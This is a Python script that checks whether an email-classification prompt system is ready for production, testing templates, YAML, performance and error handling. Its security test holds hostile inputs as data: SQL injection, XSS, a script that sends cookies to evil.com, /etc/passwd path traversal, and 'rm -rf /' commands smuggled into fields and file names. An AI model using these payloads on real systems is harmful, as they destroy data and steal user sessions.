"""
Production Validation Script for External Prompt System
=======================================================

Comprehensive validation script to ensure external prompt system
is ready for production deployment.
"""

import asyncio
import yaml
import json
from pathlib import Path
from typing import Dict, List, Any, Tuple
from dataclasses import dataclass
from datetime import datetime, timezone

# Add the parent directory to sys.path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from services.prompt_manager import PromptManager
from services.template_renderer import TemplateRenderer
from services.email_forwarding_manager import EmailForwardingManager
from exceptions.prompt_exceptions import PromptNotFoundError, PromptValidationError


@dataclass
class ValidationResult:
    """Container for validation results."""
    category: str
    test_name: str
    success: bool
    message: str
    details: Dict[str, Any] = None


class ExternalPromptValidator:
    """Comprehensive validator for external prompt system."""
    
    def __init__(self, prompts_base_path: Path):
        """Initialize validator with prompts directory."""
        self.prompts_base_path = prompts_base_path
        self.prompt_manager = PromptManager(prompts_base_path=prompts_base_path)
        self.template_renderer = TemplateRenderer()
        self.email_forwarding_manager = EmailForwardingManager(self.prompt_manager)
        self.results: List[ValidationResult] = []
    
    async def run_comprehensive_validation(self) -> Dict[str, Any]:
        """Run comprehensive validation suite."""
        print("Starting comprehensive external prompt validation...")
        
        # Run validation categories
        await self._validate_file_structure()
        await self._validate_yaml_syntax()
        await self._validate_prompt_schemas()
        await self._validate_template_rendering()
        await self._validate_security_controls()
        await self._validate_performance_requirements()
        await self._validate_error_handling()
        await self._validate_integration_points()
        
        # Generate validation report
        report = self._generate_validation_report()
        
        print("\nValidation completed!")
        return report
    
    async def _validate_file_structure(self):
        """Validate required file structure exists."""
        print("\nValidating file structure...")
        
        required_files = [
            "email_classification/system_instructions.yaml",
            "email_classification/classification_template.yaml",
            "email_forwarding/base_forward_template.yaml",
            "email_forwarding/script_template.yaml",
            "email_forwarding/negative_response.yaml",
            "email_forwarding/service_inquiry.yaml",
            "email_forwarding/no_longer_works.yaml"
        ]
        
        for file_path in required_files:
            full_path = self.prompts_base_path / file_path
            
            if full_path.exists():
                self.results.append(ValidationResult(
                    category="file_structure",
                    test_name=f"file_exists_{file_path}",
                    success=True,
                    message=f"Required file exists: {file_path}"
                ))
            else:
                self.results.append(ValidationResult(
                    category="file_structure",
                    test_name=f"file_exists_{file_path}",
                    success=False,
                    message=f"Missing required file: {file_path}"
                ))
    
    async def _validate_yaml_syntax(self):
        """Validate YAML syntax in all prompt files."""
        print("Validating YAML syntax...")
        
        yaml_files = list(self.prompts_base_path.rglob("*.yaml"))
        
        for yaml_file in yaml_files:
            try:
                with open(yaml_file, 'r') as f:
                    yaml.safe_load(f)
                
                self.results.append(ValidationResult(
                    category="yaml_syntax",
                    test_name=f"yaml_valid_{yaml_file.name}",
                    success=True,
                    message=f"Valid YAML syntax: {yaml_file.relative_to(self.prompts_base_path)}"
                ))
                
            except yaml.YAMLError as e:
                self.results.append(ValidationResult(
                    category="yaml_syntax",
                    test_name=f"yaml_valid_{yaml_file.name}",
                    success=False,
                    message=f"Invalid YAML syntax in {yaml_file.relative_to(self.prompts_base_path)}: {e}"
                ))
    
    async def _validate_prompt_schemas(self):
        """Validate prompt schemas and required fields."""
        print("Validating prompt schemas...")
        
        # Validate email classification prompts
        try:
            config = await self.prompt_manager.load_prompt_config("email_classification")
            
            # Check required fields
            required_fields = {
                "agent_config": ["name", "description", "version"],
                "system_instructions": None,  # Should be non-empty string
            }
            
            validation_success = True
            details = {}
            
            for field, subfields in required_fields.items():
                if hasattr(config, field):
                    field_value = getattr(config, field)
                    if field == "system_instructions":
                        if not field_value or len(field_value.strip()) < 100:
                            validation_success = False
                            details[field] = "System instructions too short or empty"
                    elif subfields and hasattr(field_value, '__dict__'):
                        for subfield in subfields:
                            if not hasattr(field_value, subfield):
                                validation_success = False
                                details[f"{field}.{subfield}"] = "Missing required subfield"
                else:
                    validation_success = False
                    details[field] = "Missing required field"
            
            self.results.append(ValidationResult(
                category="schema_validation",
                test_name="email_classification_schema",
                success=validation_success,
                message="Email classification schema validation",
                details=details if not validation_success else None
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="schema_validation",
                test_name="email_classification_schema",
                success=False,
                message=f"Email classification schema validation failed: {e}"
            ))
        
        # Validate template schemas
        try:
            template_config = await self.prompt_manager.load_template(
                "email_classification", 
                "classification_template"
            )
            
            validation_success = (
                template_config.template and 
                len(template_config.template.strip()) > 50 and
                template_config.template_version
            )
            
            self.results.append(ValidationResult(
                category="schema_validation",
                test_name="classification_template_schema",
                success=validation_success,
                message="Classification template schema validation"
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="schema_validation",
                test_name="classification_template_schema",
                success=False,
                message=f"Classification template schema validation failed: {e}"
            ))
    
    async def _validate_template_rendering(self):
        """Validate template rendering with test data."""
        print("Validating template rendering...")
        
        try:
            # Test classification template rendering
            template_config = await self.prompt_manager.load_template(
                "email_classification",
                "classification_template"
            )
            
            test_variables = {
                "sender_email": "test@example.com",
                "subject": "Test Subject",
                "body": "Test email body content",
                "sender_domain": "example.com",
                "domain_type": "Corporate/Legitimate",
                "content_length": 25,
                "sender_format": "Standard format",
                "domain_classification": "corporate domain",
                "length_classification": "minimal"
            }
            
            rendered = self.template_renderer.render_template(template_config, test_variables)
            
            # Verify all variables were substituted
            validation_success = True
            missing_subs = []
            
            for var_name in test_variables:
                if f"${{{var_name}}}" in rendered or f"${var_name}" in rendered:
                    validation_success = False
                    missing_subs.append(var_name)
            
            self.results.append(ValidationResult(
                category="template_rendering",
                test_name="classification_template_rendering",
                success=validation_success,
                message="Classification template rendering validation",
                details={"missing_substitutions": missing_subs} if missing_subs else None
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="template_rendering",
                test_name="classification_template_rendering",
                success=False,
                message=f"Classification template rendering failed: {e}"
            ))
        
        # Test email forwarding template rendering
        try:
            from models.email import Email, EmailSender, EmailBody
            
            test_email = Email(
                id="validation-test",
                subject="Validation Test Email",
                sender=EmailSender(email="test@example.com", name="Test User"),
                body=EmailBody(content="This is a validation test email."),
                received_datetime=datetime.now(timezone.utc)
            )
            
            email_content = await self.email_forwarding_manager.generate_forwarding_email_content(
                original_email=test_email,
                recipient_email="recipient@example.com",
                recipient_name="Test Recipient",
                scenario_type="service_inquiry"
            )
            
            validation_success = (
                "test@example.com" in email_content and
                "Validation Test Email" in email_content and
                "This is a validation test email" in email_content
            )
            
            self.results.append(ValidationResult(
                category="template_rendering",
                test_name="email_forwarding_template_rendering",
                success=validation_success,
                message="Email forwarding template rendering validation"
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="template_rendering",
                test_name="email_forwarding_template_rendering",
                success=False,
                message=f"Email forwarding template rendering failed: {e}"
            ))
    
    async def _validate_security_controls(self):
        """Validate security controls and input sanitization."""
        print("Validating security controls...")
        
        # Test input sanitization
        malicious_inputs = {
            "sender_email": "'; DROP TABLE users; --@evil.com",
            "subject": "<script>alert('XSS')</script>",
            "body": "javascript:void(0); <iframe src='evil.com'></iframe>",
            "sender_domain": "../../../etc/passwd",
            "domain_type": "${system_password}",
            "content_length": "'; rm -rf / #",
            "sender_format": '"""; import os; os.system("rm -rf /"); """',
            "domain_classification": "corporate'; DROP TABLE contacts; --",
            "length_classification": "<script>fetch('evil.com/steal?data='+document.cookie)</script>"
        }
        
        try:
            template_config = await self.prompt_manager.load_template(
                "email_classification",
                "classification_template"
            )
            
            rendered = self.template_renderer.render_template(template_config, malicious_inputs)
            
            # Check that malicious content is safely rendered as text
            security_violations = []
            
            if "<script>" in rendered.lower():
                security_violations.append("Script tag not escaped")
            if "javascript:" in rendered.lower():
                security_violations.append("JavaScript URL not sanitized")
            if "drop table" in rendered.lower():
                security_violations.append("SQL injection pattern not escaped")
            
            validation_success = len(security_violations) == 0
            
            self.results.append(ValidationResult(
                category="security_validation",
                test_name="input_sanitization",
                success=validation_success,
                message="Input sanitization security validation",
                details={"violations": security_violations} if security_violations else None
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="security_validation",
                test_name="input_sanitization",
                success=False,
                message=f"Security validation failed: {e}"
            ))
        
        # Test file path validation
        try:
            malicious_paths = [
                "../../../etc/passwd",
                "/etc/passwd",
                "~/malicious.py",
                "file.py; rm -rf /",
            ]
            
            path_validation_success = True
            
            for malicious_path in malicious_paths:
                try:
                    self.email_forwarding_manager._sanitize_file_path(malicious_path)
                    path_validation_success = False  # Should have raised exception
                    break
                except PromptValidationError:
                    pass  # Expected behavior
            
            self.results.append(ValidationResult(
                category="security_validation",
                test_name="file_path_validation",
                success=path_validation_success,
                message="File path validation security test"
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="security_validation",
                test_name="file_path_validation",
                success=False,
                message=f"File path validation test failed: {e}"
            ))
    
    async def _validate_performance_requirements(self):
        """Validate performance meets requirements."""
        print("Validating performance requirements...")
        
        import time
        
        # Test cold start performance
        try:
            self.prompt_manager.clear_cache()
            
            start_time = time.time()
            await self.prompt_manager.get_system_instructions("email_classification")
            cold_start_time = time.time() - start_time
            
            validation_success = cold_start_time < 0.1  # Must load within 100ms
            
            self.results.append(ValidationResult(
                category="performance_validation",
                test_name="cold_start_performance",
                success=validation_success,
                message=f"Cold start performance: {cold_start_time:.3f}s (requirement: <0.1s)",
                details={"measured_time": cold_start_time, "requirement": 0.1}
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="performance_validation",
                test_name="cold_start_performance",
                success=False,
                message=f"Cold start performance test failed: {e}"
            ))
        
        # Test cache hit performance
        try:
            start_time = time.time()
            await self.prompt_manager.get_system_instructions("email_classification")
            cache_hit_time = time.time() - start_time
            
            validation_success = cache_hit_time < 0.001  # Must be under 1ms for cache hits
            
            self.results.append(ValidationResult(
                category="performance_validation",
                test_name="cache_hit_performance",
                success=validation_success,
                message=f"Cache hit performance: {cache_hit_time:.6f}s (requirement: <0.001s)",
                details={"measured_time": cache_hit_time, "requirement": 0.001}
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="performance_validation",
                test_name="cache_hit_performance",
                success=False,
                message=f"Cache hit performance test failed: {e}"
            ))
    
    async def _validate_error_handling(self):
        """Validate error handling and fallback mechanisms."""
        print("Validating error handling...")
        
        # Test missing prompt handling
        try:
            nonexistent_prompt_manager = PromptManager(prompts_base_path=Path("/nonexistent"))
            
            # Should not raise exception, should return fallback
            instructions = await nonexistent_prompt_manager.get_system_instructions("email_classification")
            
            # This test should fail if we reach here since we're using the wrong path
            self.results.append(ValidationResult(
                category="error_handling",
                test_name="missing_prompt_fallback",
                success=False,
                message="Missing prompt should raise PromptNotFoundError"
            ))
            
        except PromptNotFoundError:
            # Expected behavior
            self.results.append(ValidationResult(
                category="error_handling",
                test_name="missing_prompt_fallback",
                success=True,
                message="Missing prompt correctly raises PromptNotFoundError"
            ))
        except Exception as e:
            self.results.append(ValidationResult(
                category="error_handling",
                test_name="missing_prompt_fallback",
                success=False,
                message=f"Unexpected error for missing prompt: {e}"
            ))
        
        # Test malformed YAML handling
        try:
            # Create temporary malformed YAML file
            import tempfile
            
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_prompts = Path(temp_dir)
                malformed_dir = temp_prompts / "malformed_prompt"
                malformed_dir.mkdir(parents=True)
                
                malformed_file = malformed_dir / "system_instructions.yaml"
                malformed_file.write_text("invalid: yaml: content: [unclosed")
                
                malformed_prompt_manager = PromptManager(prompts_base_path=temp_prompts)
                
                try:
                    await malformed_prompt_manager.load_prompt_config("malformed_prompt")
                    validation_success = False  # Should have raised exception
                except Exception:
                    validation_success = True  # Expected behavior
                
                self.results.append(ValidationResult(
                    category="error_handling",
                    test_name="malformed_yaml_handling",
                    success=validation_success,
                    message="Malformed YAML handling validation"
                ))
                
        except Exception as e:
            self.results.append(ValidationResult(
                category="error_handling",
                test_name="malformed_yaml_handling",
                success=False,
                message=f"Malformed YAML handling test failed: {e}"
            ))
    
    async def _validate_integration_points(self):
        """Validate integration with existing systems."""
        print("Validating integration points...")
        
        # Test prompt manager integration
        try:
            # Verify all required methods exist and work
            methods_to_test = [
                "load_prompt_config",
                "get_system_instructions", 
                "load_template",
                "clear_cache",
                "get_cache_statistics"
            ]
            
            integration_success = True
            missing_methods = []
            
            for method_name in methods_to_test:
                if not hasattr(self.prompt_manager, method_name):
                    integration_success = False
                    missing_methods.append(method_name)
            
            self.results.append(ValidationResult(
                category="integration_validation",
                test_name="prompt_manager_interface",
                success=integration_success,
                message="PromptManager interface validation",
                details={"missing_methods": missing_methods} if missing_methods else None
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="integration_validation",
                test_name="prompt_manager_interface",
                success=False,
                message=f"PromptManager interface validation failed: {e}"
            ))
        
        # Test template renderer integration
        try:
            renderer_methods = [
                "render_template",
                "validate_template_variables",
                "get_rendering_statistics",
                "clear_template_cache"
            ]
            
            integration_success = True
            missing_methods = []
            
            for method_name in renderer_methods:
                if not hasattr(self.template_renderer, method_name):
                    integration_success = False
                    missing_methods.append(method_name)
            
            self.results.append(ValidationResult(
                category="integration_validation",
                test_name="template_renderer_interface",
                success=integration_success,
                message="TemplateRenderer interface validation",
                details={"missing_methods": missing_methods} if missing_methods else None
            ))
            
        except Exception as e:
            self.results.append(ValidationResult(
                category="integration_validation",
                test_name="template_renderer_interface",
                success=False,
                message=f"TemplateRenderer interface validation failed: {e}"
            ))
    
    def _generate_validation_report(self) -> Dict[str, Any]:
        """Generate comprehensive validation report."""
        # Calculate summary statistics
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.success)
        failed_tests = total_tests - passed_tests
        
        # Group results by category
        by_category = {}
        for result in self.results:
            if result.category not in by_category:
                by_category[result.category] = {"passed": 0, "failed": 0, "tests": []}
            
            by_category[result.category]["tests"].append({
                "test_name": result.test_name,
                "success": result.success,
                "message": result.message,
                "details": result.details
            })
            
            if result.success:
                by_category[result.category]["passed"] += 1
            else:
                by_category[result.category]["failed"] += 1
        
        # Determine overall validation status
        overall_success = failed_tests == 0
        
        report = {
            "validation_summary": {
                "overall_success": overall_success,
                "total_tests": total_tests,
                "passed_tests": passed_tests,
                "failed_tests": failed_tests,
                "success_rate": (passed_tests / total_tests * 100) if total_tests > 0 else 0,
                "timestamp": datetime.now(timezone.utc).isoformat()
            },
            "category_results": by_category,
            "detailed_results": [
                {
                    "category": r.category,
                    "test_name": r.test_name,
                    "success": r.success,
                    "message": r.message,
                    "details": r.details
                } for r in self.results
            ],
            "recommendations": self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations based on validation results."""
        recommendations = []
        
        # Check for critical failures
        critical_failures = [r for r in self.results if not r.success and 
                           r.category in ["file_structure", "yaml_syntax", "security_validation"]]
        
        if critical_failures:
            recommendations.append(
                f"Critical validation failures detected ({len(critical_failures)}). "
                "System is not ready for production deployment."
            )
        
        # Check performance issues
        performance_failures = [r for r in self.results if not r.success and 
                              r.category == "performance_validation"]
        
        if performance_failures:
            recommendations.append(
                "Performance requirements not met. Consider optimization before deployment."
            )
        
        # Check template issues
        template_failures = [r for r in self.results if not r.success and 
                           r.category == "template_rendering"]
        
        if template_failures:
            recommendations.append(
                "Template rendering issues detected. Verify template syntax and variables."
            )
        
        # Success case
        if not any([critical_failures, performance_failures, template_failures]):
            recommendations.append(
                "All validations passed. System is ready for production deployment."
            )
        
        return recommendations


async def main():
    """Run the validation script."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Validate external prompt system for production")
    parser.add_argument("--prompts-dir", type=Path,
                       default=Path(__file__).parent.parent / "prompts",
                       help="Path to prompts directory")
    parser.add_argument("--output", type=Path,
                       default=Path("validation_results.json"),
                       help="Output file for validation results")
    
    args = parser.parse_args()
    
    if not args.prompts_dir.exists():
        print(f"Error: Prompts directory not found: {args.prompts_dir}")
        return 1
    
    try:
        validator = ExternalPromptValidator(args.prompts_dir)
        results = await validator.run_comprehensive_validation()
        
        # Save results
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\nValidation results saved to: {args.output}")
        
        # Print summary
        summary = results["validation_summary"]
        print(f"\nValidation Summary:")
        print(f"  Overall Success: {summary['overall_success']}")
        print(f"  Tests Passed: {summary['passed_tests']}/{summary['total_tests']}")
        print(f"  Success Rate: {summary['success_rate']:.1f}%")
        
        if not summary['overall_success']:
            print(f"\nFailed Tests:")
            for result in results["detailed_results"]:
                if not result["success"]:
                    print(f"  - {result['category']}.{result['test_name']}: {result['message']}")
        
        print(f"\nRecommendations:")
        for rec in results["recommendations"]:
            print(f"  - {rec}")
        
        return 0 if summary['overall_success'] else 1
        
    except Exception as e:
        print(f"Validation failed: {e}")
        return 1


if __name__ == "__main__":
    import sys
    sys.exit(asyncio.run(main()))